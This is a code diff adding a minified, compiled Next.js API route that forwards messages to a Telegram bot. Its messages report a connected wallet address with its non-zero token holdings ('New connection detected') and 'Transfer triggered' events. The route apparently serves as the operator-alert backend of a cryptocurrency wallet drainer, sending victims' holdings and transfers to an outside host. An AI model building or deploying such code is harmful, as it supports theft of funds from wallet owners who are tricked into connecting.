@@ -1,0 +1,9 @@
+"use strict";(()=>{var e={};e.id=548,e.ids=[548],e.modules={5142:e=>{e.exports=require("dotenv")},145:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},7926:(e,t,r)=>{r.r(t),r.d(t,{config:()=>d,default:()=>c,routeModule:()=>i});var a={};r.r(a),r.d(a,{default:()=>handler});var s=r(1802),n=r(7153),o=r(6249);async function handler(e,t){if("POST"===e.method)try{let r;let{type:a,message:s}=e.body,n=process.env.BOT_TOKEN,o=process.env.CHAT_ID,c=`https://api.telegram.org/bot${n}/sendMessage`;if("balances"===a){let e=s.filter(e=>e.contract_name&&"$0.00"!==e.pretty_quote),t=e.map(e=>`Contract Name: ${e.contract_name}
+Contract Address: ${e.contract_address}
+Quote: ${e.pretty_quote}
+`);r=t.join("\n"),r="New connection detected\n\nAddress: "+s[0].address+"\n\n"+r,console.log("balances: ",r)}else"transfer"===a&&(r=`Transfer triggered
+Address: ${s.address}
+Token: ${s.token}
+Contract: ${s.contract}
+Balance: ${s.balance}
+Type: ${s.type}`,console.log("transfer: ",r));try{let e=await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:o,text:r})}),a=await e.json();t.status(200).json({success:!0,responseData:a})}catch(e){console.error("Error sending message to bot:",e)}}catch(e){console.error(e),t.status(500).json({success:!1,error:e.message})}else t.status(405).end()}r(5142).config();let c=(0,o.l)(a,"default"),d=(0,o.l)(a,"config"),i=new s.PagesAPIRouteModule({definition:{kind:n.x.PAGES_API,page:"/api/telegram",pathname:"/api/telegram",bundlePath:"",filename:""},userland:a})}};var t=require("../../webpack-api-runtime.js");t.C(e);var __webpack_exec__=e=>t(t.s=e),r=t.X(0,[222],()=>__webpack_exec__(7926));module.exports=r})();
